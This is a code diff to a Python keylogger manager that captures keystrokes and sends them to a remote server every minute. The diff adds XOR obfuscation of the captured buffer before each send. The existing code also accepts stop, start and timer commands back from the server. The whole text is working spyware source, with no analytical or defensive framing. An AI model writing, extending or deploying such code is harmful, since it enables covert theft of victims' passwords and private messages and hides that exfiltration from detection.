@@ -4,6 +4,9 @@ from send_ping import SendPing
 from send_data import SendData
 from key_logger_service import KeyLoggerService
 from update_status import UpdateStatus
+from encrypt import Encryption
+from file_writer import FileWriter
+
 
 class KeyLoggerManager:
 
@@ -13,9 +16,11 @@ class KeyLoggerManager:
 
     def start_key_logger(self):
         self.service.start_listener()
+        
         generator = self.service.send_every_minute()
         for data in generator:
-            data = {"data": data}
+            encrypted_data = Encryption(data).xor_encryption()
+            data = {"data": encrypted_data}
             server_commend = SendData().writing(data)
             if not server_commend:
                 self.service.stop_listener()
@@ -28,7 +33,8 @@ class KeyLoggerManager:
 
         generator = self.service.send_every_minute()
         for data in generator:
-            data = {"data": data}
+            encrypted_data = Encryption(data).xor_encryption()
+            data = {"data": encrypted_data}
             commend, new_timer = SendData().writing(data)
 
             # check for new commend stop/start/new timer
@@ -43,10 +49,12 @@ class KeyLoggerManager:
     def stop_listener_safely(self):
         with self.service.lock:
             if self.service.key_buffer:
-                data = {"data": self.service.key_buffer}
+                encrypted_data = Encryption(self.service.key_buffer).xor_encryption()
+                data = {"data": encrypted_data}
                 SendData().writing(data)
                 self.service.clean_buffer()
         self.service.stop_listener()
+
 
     def start(self):
         is_listening = False
